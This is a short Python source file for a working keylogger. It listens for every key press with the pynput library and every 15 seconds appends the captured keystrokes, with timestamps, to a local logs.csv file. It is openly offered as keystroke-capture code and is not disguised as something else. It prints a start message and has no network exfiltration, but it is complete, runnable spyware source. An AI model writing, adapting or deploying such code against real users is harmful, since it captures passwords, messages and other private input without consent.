import pynput.keyboard
import threading
import os
import time

class Keylogger:

    def __init__(self):
        self.log = "Keylogger Has Started"
        print(self.log)

    def append_to_log(self,string):
        self.log += string

    def process_key_press(self,key):
        try:
            current_key = str(key.char)
        except AttributeError:
            if key == key.space:
                current_key = " "
            else:
                current_key = " "+str(key)+" "
        self.append_to_log(current_key)

    def get_time(self):
        named_tuple = time.localtime() 
        time_string = time.strftime("%m/%d/%Y, %H:%M:%S", named_tuple)
        return time_string

    def write_to_file(self,string):
        curr_dir = os.getcwd()
        filename = os.path.join(curr_dir,'logs.csv')
        if string != "":
            f = open(filename,'a')
            time = self.get_time()
            f.write("%s,%s\n"%(string,time))
            f.close()

    def report(self):
        self.write_to_file(self.log)
        self.log = ""
        timer = threading.Timer(15,self.report)
        timer.start()

    def start(self):
        keyboard_listener = pynput.keyboard.Listener(on_press=self.process_key_press)
        with keyboard_listener:
            self.report()
            keyboard_listener.join()